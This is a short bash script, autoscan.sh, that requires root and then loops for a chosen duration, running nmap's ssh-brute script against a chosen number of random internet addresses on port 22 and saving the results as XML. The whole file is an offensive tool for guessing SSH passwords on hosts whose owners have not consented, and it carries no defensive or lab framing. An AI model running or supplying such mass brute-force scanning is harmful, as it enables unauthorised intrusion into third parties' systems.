#!/bin/bash

if [ `whoami` != 'root' ]; then
echo "--=[Run nmap ssh-brute on random hosts every x mins]=--";
echo "[x] You need to run as root";
echo "[x] Usage: sudo autoscan.sh -i 5 -d 60 -n 250";
echo "[x] This will exec commands every 5 mins for 60 mins scanning 250 ips";
exit;
fi

echo "~[SSH Auto Scan With Bruteforce Repeat Execution Script]~";
echo "[*] Usage: sudo autoscan.sh -i 5 -d 60 -n 250";
echo "[*] This will exec commands every 10 mins for 60 mins scanning 250 ips";
echo "";
echo "";

while getopts i:d:n: opt; do
    case $opt in
        i)  interval=$OPTARG;;
        d)  duration=$OPTARG;;
        n)  numberip=$OPTARG;;
    esac
done

now=$(date '+%s')
interval=$((interval*60))
end=$(date -d "+ $duration minutes" '+%s' || date -v+"$duration"M '+%s')

until ((now>=end)); do
    clear
    nmap -v -oX ~/nmapscan/nmap-$RANDOM.xml -iR $numberip -p22 --script ssh-brute --script-args ssh-brute.timeout=4s

    sleep "$interval"
    now=$(date '+%s')
done

